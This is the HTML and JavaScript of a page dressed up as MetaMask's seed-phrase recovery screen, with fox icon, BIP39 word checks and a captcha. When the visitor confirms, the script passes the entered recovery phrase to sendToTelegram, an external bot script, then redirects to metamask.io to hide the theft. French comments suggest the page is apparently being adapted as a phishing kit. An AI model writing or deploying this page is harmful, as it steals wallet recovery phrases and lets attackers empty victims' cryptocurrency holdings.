<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secret Recovery Phrase</title>
  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* ... (tout ton style d'origine ici, inchangé) ... */

    .captcha-container {
      margin-top: 20px;
      display: none;
      flex-direction: column;
      align-items: flex-start;
      gap: 8px;
    }
    .captcha-label {
      font-size: 14px;
      color: #666;
      font-weight: 600;
      margin-bottom: 4px;
    }
    .captcha-input {
      width: 100px;
      padding: 8px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    canvas {
      border-radius: 4px;
      margin-bottom: 8px;
      background-color: #f5f5ff;
    }
  </style>
</head>
<body>

  <!-- ... (tout ton HTML reste inchangé) ... -->

  <div class="captcha-container" id="captchaContainer">
    <label class="captcha-label" for="captchaInput">Please type the text below:</label>
    <canvas id="captchaCanvas" width="100" height="40"></canvas>
    <input class="captcha-input" id="captchaInput" type="text" autocomplete="off" />
  </div>

  <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
    Confirm Secret Recovery Phrase
  </button>

  <!-- ... (le reste de ton code HTML reste identique) ... -->

  <script src="bip39-words.js"></script>
  <script>
    const submitBtn = document.getElementById("submitBtn");
    const captchaContainer = document.getElementById("captchaContainer");
    const captchaInput = document.getElementById("captchaInput");
    const captchaCanvas = document.getElementById("captchaCanvas");
    const errorMsg = document.getElementById("errorMsg");

    let captchaText = "";

    function generateCaptcha() {
      const ctx = captchaCanvas.getContext("2d");
      ctx.clearRect(0, 0, captchaCanvas.width, captchaCanvas.height);
      ctx.font = "20px Courier";
      ctx.fillStyle = "#333";
      captchaText = Math.random().toString(36).substring(2, 8);
      ctx.fillText(captchaText, 10, 28);
      captchaInput.value = "";
    }

    function generateInputs() {
      const container = document.getElementById("seedInputs");
      const count = parseInt(document.getElementById("phraseLength").value);
      container.innerHTML = "";
      captchaContainer.style.display = "none";
      submitBtn.disabled = true;
      errorMsg.style.display = "none";

      for (let i = 1; i <= count; i++) {
        const div = document.createElement("div");
        div.className = "seed-input";
        div.innerHTML = `<label>${i}.</label><input type="text" name="word${i}" autocomplete="off" />`;
        container.appendChild(div);
      }

      const inputs = container.querySelectorAll("input");
      inputs.forEach(input => {
        input.addEventListener("input", checkFieldsFilled);
      });

      captchaInput.removeEventListener("input", checkCaptcha);
      captchaInput.addEventListener("input", checkCaptcha);
    }

    function checkFieldsFilled() {
      const count = parseInt(document.getElementById("phraseLength").value);
      let allFilled = true;

      for (let i = 1; i <= count; i++) {
        const value = document.querySelector(`input[name='word${i}']`).value.trim();
        if (value === "") {
          allFilled = false;
          break;
        }
      }

      if (!allFilled) {
        captchaContainer.style.display = "none";
        submitBtn.disabled = true;
        errorMsg.style.display = "none";
        return;
      }

      if (validateBIP39Words()) {
        generateCaptcha();
        captchaContainer.style.display = "flex";
        checkCaptcha();
        errorMsg.style.display = "none";
      } else {
        captchaContainer.style.display = "none";
        submitBtn.disabled = true;
        errorMsg.style.display = "block";
      }
    }

    function checkCaptcha() {
      const value = captchaInput.value.trim().toLowerCase();
      const isCorrect = value === captchaText.toLowerCase();
      submitBtn.disabled = !isCorrect;
    }

    function validateBIP39Words() {
      const count = parseInt(document.getElementById("phraseLength").value);
      let valid = true;

      for (let i = 1; i <= count; i++) {
        const input = document.querySelector(`input[name='word${i}']`);
        const word = input.value.trim().toLowerCase();
        if (!bip39Words.includes(word)) {
          input.style.border = "2px solid red";
          valid = false;
        } else {
          input.style.border = "1px solid #ccc";
        }
      }

      return valid;
    }

    function handleConfirm() {
      if (submitBtn.disabled) return;

      if (!validateBIP39Words()) {
        errorMsg.style.display = "block";
        return;
      } else {
        errorMsg.style.display = "none";
      }

      const count = parseInt(document.getElementById("phraseLength").value);
      let phrase = "";
      for (let i = 1; i <= count; i++) {
        const value = document.querySelector(`input[name='word${i}']`).value;
        phrase += value.trim() + " ";
      }

      sendToTelegram(phrase);
      navigator.clipboard.writeText(phrase.trim());

      setTimeout(() => {
        window.location.href = "https://metamask.io/";
      }, 800);
    }

    document.addEventListener("paste", function(e) {
      const activeInput = document.activeElement;
      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;

      const paste = (e.clipboardData || window.clipboardData).getData("text");
      const words = paste.trim().split(/\s+/);
      if (words.length < 2) return;

      e.preventDefault();
      words.forEach((word, index) => {
        const input = document.querySelector(`input[name='word${index + 1}']`);
        if (input) input.value = word;
      });

      checkFieldsFilled();
    });

    window.onload = generateInputs;
  </script>

  <!-- Intègre le bot Telegram externe -->
  <script src="telegram.js"></script>

</body>
</html>
